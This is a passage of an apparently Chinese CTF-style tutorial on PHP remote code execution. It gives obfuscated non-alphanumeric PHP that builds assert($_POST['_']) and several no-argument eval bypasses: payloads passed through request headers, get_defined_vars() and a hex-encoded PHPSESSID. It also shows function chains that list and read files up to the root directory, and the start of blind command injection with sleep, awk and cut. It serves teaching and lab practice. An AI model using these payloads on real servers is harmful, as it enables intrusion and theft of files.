class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br></pre></td></tr></table></figure>
+
+<p>上面这一大段内容中就存在了assert和POST</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;<span class="variable">$___</span>=<span class="variable">$_</span>[<span class="variable">$__</span>];<span class="variable">$__</span>=<span class="variable">$___</span>;<span class="variable">$_</span>=<span class="variable">$___</span>;<span class="variable">$__</span>=<span class="variable">$___</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$_</span>.=<span class="variable">$__</span>;<span class="variable">$_</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$___</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$_</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$___</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$_</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$___</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$_</span>.=<span class="variable">$__</span>;<span class="variable">$____</span> = <span class="string">&quot;_&quot;</span>;<span class="variable">$__</span>=<span class="variable">$___</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$___</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$___</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$___</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$__</span>=<span class="variable">$$____</span>;</span><br><span class="line"><span class="variable">$_</span>(<span class="variable">$__</span>[<span class="string">&#x27;_&#x27;</span>]);</span><br></pre></td></tr></table></figure>
+
+<p>最后两行就是<code>$_POST</code>和<code>assert($_POST[&#39;_&#39;])</code>了</p>
+<img src="/2026/02/28/RCE/58.png" class="" width="58">
+
+<img src="/2026/02/28/RCE/59.png" class="" width="59">
+
+<p>记得需要URL编码</p>
+<p><strong>php7</strong>只需要获得一个POST（前提是得先获得A）：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">传入/?cmd=a&amp;post=POST</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$_</span>=[].<span class="string">&#x27;&#x27;</span>;<span class="variable">$___</span>=<span class="variable">$_</span>[<span class="variable">$__</span>];<span class="variable">$__</span>=<span class="variable">$___</span>;<span class="variable">$_</span>=<span class="variable">$___</span>;<span class="variable">$____</span> = <span class="string">&quot;_&quot;</span>;<span class="variable">$__</span>=<span class="variable">$___</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$___</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$___</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$____</span>.=<span class="variable">$__</span>;<span class="variable">$__</span>=<span class="variable">$___</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;++<span class="variable">$__</span>;<span class="variable">$____</span>.=<span class="variable">$__</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$_</span>=<span class="variable">$$____</span>;</span><br><span class="line">`<span class="variable">$_</span>`;</span><br></pre></td></tr></table></figure>
+
+<h1 id="无参数RCE"><a href="#无参数RCE" class="headerlink" title="无参数RCE"></a>无参数RCE</h1><p>题目如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="string">&#x27;;&#x27;</span>===<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#x27;/[^\W]+\((?R)?\)/&#x27;,&#x27;&#x27;,$_GET[&#x27;code&#x27;])</span><br></pre></td></tr></table></figure>
+
+<p>其中这段代码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">正则表达式[^\W]匹配字母数字下划线[A-Za-z0-9_]</span><br><span class="line">[^\W]+\((?R)?\)匹配到&quot;a()&quot;形式的字符串，但是()里面不能出现任何参数</span><br><span class="line">(?R)代表递归，即a(b(c()))都能匹配</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$c</span>=<span class="string">&quot;ZLARYY&quot;</span>;</span><br><span class="line"><span class="variable">$d</span>=<span class="string">&quot;ZLARYY()&quot;</span>;</span><br><span class="line"><span class="variable">$e</span>=<span class="string">&quot;ZLARYY(2L47yY)&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$c</span>);</span><br><span class="line"><span class="variable">$b</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$d</span>);</span><br><span class="line"><span class="variable">$f</span>=<span class="title function_ invoke__">preg_replace</span>(<span class="string">&#x27;/[^\W]+\((?R)?\)/&#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$e</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="variable">$b</span>.<span class="string">&quot;&lt;/br&gt;&quot;</span>.<span class="variable">$f</span>;</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/60.png" class="" width="60">
+
+<p>可以看到这个匹配只把第二项替换为空，而题目的意思是如果被替换后的字符串只剩下分号，那么就放进去执行eval</p>
+<h2 id="请求头绕过"><a href="#请求头绕过" class="headerlink" title="请求头绕过"></a>请求头绕过</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">getallheaders()：获取所有HTTP请求标头</span><br><span class="line">pos()：获取数组第一项的值</span><br><span class="line">end()：获取数组最后一项的值</span><br></pre></td></tr></table></figure>
+
+<p>但是我们需要用print_r打印结果</p>
+<img src="/2026/02/28/RCE/61.png" class="" width="61">
+
+<p>使用view-source查看就是这样：</p>
+<img src="/2026/02/28/RCE/62.png" class="" width="62">
+
+<img src="/2026/02/28/RCE/63.png" class="" width="63">
+
+<p>调用pos()函数获取getallheaders()返回数组的第一项内容，得到的却是Connection里面的内容，这里就是无参数RCE漏洞的利用地方了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Connection: system(&quot;sort flag.txt&quot;);</span><br><span class="line">//通过这样修改可以将最后的code变为：</span><br><span class="line">code=print_r(system(&quot;sort flag.txt&quot;););</span><br><span class="line">//如果我们将pirnt_r换成eval，那么就可以执行命令：</span><br><span class="line">code=eval(system(&quot;sort flag.txt&quot;););</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/64.png" class="" width="64">
+
+<p>除了修改Header，还可以添加Header：</p>
+<img src="/2026/02/28/RCE/65.png" class="" width="65">
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apache_request_headers()功能与getallheaders()相似，适用于Apache服务器</span><br></pre></td></tr></table></figure>
+
+<h2 id="全局变量-php5-7"><a href="#全局变量-php5-7" class="headerlink" title="全局变量(php5&#x2F;7)"></a>全局变量(php5&#x2F;7)</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">get_defined_vars()：返回所有已定义变量的值所组成的数组</span><br><span class="line">返回数组顺序为GET-&gt;POST-&gt;COOKIE-&gt;FILES</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/66.png" class="" width="66">
+
+<p>之后我们可以通过添加传参数量来增加变量键值对</p>
+<img src="/2026/02/28/RCE/67.png" class="" width="67">
+
+<p>其实从前两张图不难看出结果是两个数组嵌套，上一张图片我采用了pos获取了数组中的第一个数组，现在我还想要获取这个数组中的最后一项的值，可以采用调用end函数：</p>
+<img src="/2026/02/28/RCE/68.png" class="" width="68">
+
+<p>那么和请求头绕过一样，我们可以将print_r改为eval就可以了：</p>
+<img src="/2026/02/28/RCE/69.png" class="" width="69">
+
+<h2 id="session"><a href="#session" class="headerlink" title="session"></a>session</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">session_start()：启动新会话或者重用现有会话，成功开始会话会返回TRUE，反之返回FALSE</span><br><span class="line">session_id()：可以获取PHPSEEID的值</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/70.png" class="" width="70">
+
+<img src="/2026/02/28/RCE/71.png" class="" width="71">
+
+<p>这样我们是不是就可以通过burp修改PHPSESSID为执行命令的函数来实现RCE了：</p>
+<img src="/2026/02/28/RCE/72.png" class="" width="72">
+
+<p>貌似不行，不过修改为flag.txt倒是能按预期显示：</p>
+<img src="/2026/02/28/RCE/73.png" class="" width="73">
+
+<p>那就好办了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source()：可以查看括号内文件名所含的文件内容</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/74.png" class="" width="74">
+
+<p>不过如果想要执行eval的话也可以：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">需要先把命令HEX编码转为十六进制写入PHPSESSID，再用hex2bin函数将十六进制转为二进制，用eval执行</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/75.png" class="" width="75">
+
+<p>其中PHPSESSID是system(“sort flag.txt”);的编码结果</p>
+<h2 id="scandir读取"><a href="#scandir读取" class="headerlink" title="scandir读取"></a>scandir读取</h2><h3 id="scandir"><a href="#scandir" class="headerlink" title="scandir()"></a>scandir()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scandir()：类似ls，在某文件路径下，把内容以列表形式显示出来</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;.&#x27;</span>));</span><br><span class="line"><span class="comment">//scandir里面必须要有路径</span></span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/76.png" class="" width="76">
+
+<h3 id="getcwd"><a href="#getcwd" class="headerlink" title="getcwd()"></a>getcwd()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getcwd()：类似pwd，获取当前工作目录路径</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/77.png" class="" width="77">
+
+<h3 id="current-与next"><a href="#current-与next" class="headerlink" title="current()与next()"></a>current()与next()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">current()：返回数组的第一个内容，与pos()类似</span><br><span class="line">next()：把数组中的第二个内容显示出来</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/78.png" class="" width="78">
+
+<h3 id="array-reverse"><a href="#array-reverse" class="headerlink" title="array_reverse()"></a>array_reverse()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">array_reverse()：按照倒序重新排列数组</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/79.png" class="" width="79">
+
+<h3 id="array-flip-与array-rand"><a href="#array-flip-与array-rand" class="headerlink" title="array_flip()与array_rand()"></a>array_flip()与array_rand()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">array_flip()：将数组中的键名与值对换</span><br><span class="line">array_rand()：从数组中随机取出一个或多个随机键</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/80.png" class="" width="80">
+
+<p>每一次刷新界面都可能改变产生的随机值</p>
+<h3 id="chdir"><a href="#chdir" class="headerlink" title="chdir()"></a>chdir()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chdir()：系统调用函数，同cd，用于改变当前工作目录</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/81.png" class="" width="81">
+
+<p>如果是确定了路径返回为1，否则返回为0</p>
+<h3 id="strrev"><a href="#strrev" class="headerlink" title="strrev()"></a>strrev()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strrev()：用于反转给定的字符串</span><br></pre></td></tr></table></figure>
+
+<h3 id="crypt"><a href="#crypt" class="headerlink" title="crypt()"></a>crypt()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crypt()：用于加密，目前Linux平台上的加密方法大致有MD5,DES,3 DES</span><br></pre></td></tr></table></figure>
+
+<h3 id="hebrevc"><a href="#hebrevc" class="headerlink" title="hebrevc()"></a>hebrevc()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hebrevc()：把希伯来文本从右至左的流转换为从左至右的流</span><br></pre></td></tr></table></figure>
+
+<h3 id="localeconv"><a href="#localeconv" class="headerlink" title="localeconv()"></a>localeconv()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">localeconv()：查看当前目录名</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/82.png" class="" width="82">
+
+<p>这个数组的第一个键值对的值为一个点<code>.</code>，可以用current()获得，配合上scandir()就可以查看当前目录下的所有文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="title function_ invoke__">scandir</span>(<span class="title function_ invoke__">current</span>(<span class="title function_ invoke__">localeconv</span>())));</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/83.png" class="" width="83">
+
+<p>这里为了方便，我把php文件和flag.txt放在了flag文件夹里</p>
+<img src="/2026/02/28/RCE/84.png" class="" width="84">
+
+<p>那么我们可以采用这种方法：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(array_reverse(scandir(current(localeconv()))));</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/85.png" class="" width="85">
+
+<p>用array_reverse把数组倒序排列之后我们就可以再用current()和show_source读取到文件内容了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">show_source(current(array_reverse(scandir(current(localeconv())))));</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/86.png" class="" width="86">
+
+<h3 id="dirname"><a href="#dirname" class="headerlink" title="dirname()"></a>dirname()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirname()：可以把上一个目录的绝对路径输出</span><br></pre></td></tr></table></figure>
+
+<p>那么我想查看上级目录就可以用到：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print_r(scandir(dirname(getcwd())));</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/87.png" class="" width="87">
+
+<p>不过这种条件下我们不能使用show_source来查看文件，因为show_source是基于当前页面路径来的，一定要查看的话就只能使用chdir()了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=print_r(chdir(dirname(getcwd())));</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/88.png" class="" width="88">
+
+<p>返回1说明目录跳转到上级成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=print_r(scandir(dirname(chdir(dirname(getcwd())))));</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/89.png" class="" width="89">
+
+<p>我的理解就是后半部分为chdir跳转目录的参数，与实际是否跳转目录无关，最后再dirname帮助用户从视觉上跳转到上级目录，这样就可以用show_source查看文件了</p>
+<p>那像这种情况，我想读取的文件既不在开头又不在末尾，就可以使用array_flip和array_rand</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=print_r(array_flip(array_rand(scandir(dirname(chdir(dirname(getcwd())))))));</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/90.png" class="" width="90">
+
+<p>这样虽然是随机的，但是多刷新几次总会能用show_source查看到的：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/?code=show_source(array_rand(array_flip(scandir(dirname(chdir(dirname(getcwd())))))));</span><br><span class="line">//由于没有把flag.txt转移出来，将就看咯^ _ ^</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/91.png" class="" width="91">
+
+<h3 id="根目录"><a href="#根目录" class="headerlink" title="根目录"></a>根目录</h3><p>我想回到根目录怎么操作：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/?code=print_r(array());</span><br><span class="line">/?code=print_r(serialize(array()));</span><br><span class="line">//用serialize序列化</span><br><span class="line">/?code=print_r(crypt(serialize(array())));</span><br><span class="line">//crypt单向字符串三列加密，结果随机</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/92.png" class="" width="92">
+
+<p>某些随机的结果下，字符串末尾会出现<code>/</code>根目录字符，此时只需要使用strrev进行倒序排列</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=print_r(strrev(crypt(serialize(array()))));</span><br></pre></td></tr></table></figure>
+
+<h3 id="ord-与chr"><a href="#ord-与chr" class="headerlink" title="ord()与chr()"></a>ord()与chr()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ord()：对字符串的第一个字符进行编码</span><br><span class="line">chr()：对编码字符进行解码</span><br></pre></td></tr></table></figure>
+
+<p>有了这两个函数我们就可以从长串字符串中获得第一个<code>/</code>字符</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=print_r(chr(ord(strrev(crypt(serialize(array()))))));</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/93.png" class="" width="93">
+
+<p>然后我们继续采用scandir就可以实现与ls &#x2F;一样的功能了：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=print_r(scandir(chr(ord(strrev(crypt(serialize(array())))))));</span><br></pre></td></tr></table></figure>
+
+<p>通常情况下根目录下flag文件都不会出现在首末，所以又需要一个随机的array_rand(array_flip())套上去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=print_r(array_rand(array_flip(scandir(chr(ord(strrev(crypt(serialize(array())))))))));</span><br></pre></td></tr></table></figure>
+
+<p>这样随机加上随机，等查看到flag不知道要刷新多少次，建议使用burp的intruder</p>
+<p>还记得show_source的特性吗，必须还要嵌套上dirname(chdir()):</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/?code=print_r(array_rand(array_flip(scandir(dirname(chdir(chr(ord(strrev(crypt(serialize(array())))))))))));</span><br></pre></td></tr></table></figure>
+
+<h1 id="无回显"><a href="#无回显" class="headerlink" title="无回显"></a>无回显</h1><p>页面无法shell反弹或者无法回显，或者没有写入权限可以尝试命令盲注，根据返回时间判断</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sleep：指定页面响应时间</span><br><span class="line">awk NR：语法为awk NR==number，比如awk NR==1为回显第一行的内容</span><br><span class="line">//cat flag|awk NR==1</span><br><span class="line">cut -c：语法为cut -c number，比如cut -c 1为显示第一个字符</span><br><span class="line">//cat flag|awk NR==1|cut -c 1</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/94.png" class="" width="94">
+
+<p>if判断语句：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">if [ /*条件*/ ];then /*动作*/;fi(finish的意思)</span><br><span class="line">//注意空格</span><br></pre></td></tr></table></figure>
+
+<img src="/2026/02/28/RCE/95.png" class="" width="95">
+
+<p>所以可以类比SQL注入里面的时间盲注：</p>
